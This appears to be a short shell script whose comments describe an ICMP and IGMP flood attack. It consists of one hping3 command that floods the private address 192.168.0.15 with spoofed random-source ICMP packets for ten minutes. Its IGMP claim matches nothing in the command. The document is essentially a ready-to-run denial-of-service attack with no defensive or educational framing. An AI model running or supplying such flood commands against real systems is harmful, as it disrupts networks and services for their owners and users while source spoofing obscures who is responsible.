# Script to do a ICMP and IGMP flood attack on the target machine

# Execute the ICMP and IGMP flood attack
timeout 10m hping3 --flood --rand-source -1 -p 80 192.168.0.15

